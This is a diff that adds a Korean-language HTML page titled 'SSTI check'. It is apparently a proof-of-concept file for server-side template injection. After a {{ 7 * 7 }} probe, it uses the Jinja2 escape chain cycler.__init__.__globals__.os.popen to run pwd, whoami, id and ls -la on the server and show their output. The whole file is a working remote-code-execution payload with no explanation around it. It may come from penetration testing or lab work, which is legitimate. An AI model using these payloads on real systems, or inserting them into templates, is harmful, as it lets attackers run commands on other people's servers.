@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>SSTI 확인</title>
+</head>
+<body>
+    <h1>SSTI 확인</h1>
+
+    <h2>계산 테스트</h2>
+    <pre>{{ 7 * 7 }}</pre>
+
+    <h2>현재 경로</h2>
+    <pre>{{ cycler.__init__.__globals__.os.popen('/usr/bin/pwd').read() }}</pre>
+
+    <h2>현재 사용자</h2>
+    <pre>{{ cycler.__init__.__globals__.os.popen('/usr/bin/whoami').read() }}</pre>
+
+    <h2>사용자 ID 정보</h2>
+    <pre>{{ cycler.__init__.__globals__.os.popen('/usr/bin/id').read() }}</pre>
+
+    <h2>현재 디렉터리 파일 목록</h2>
+    <pre>{{ cycler.__init__.__globals__.os.popen('/usr/bin/ls -la').read() }}</pre>
+</body>
+</html>
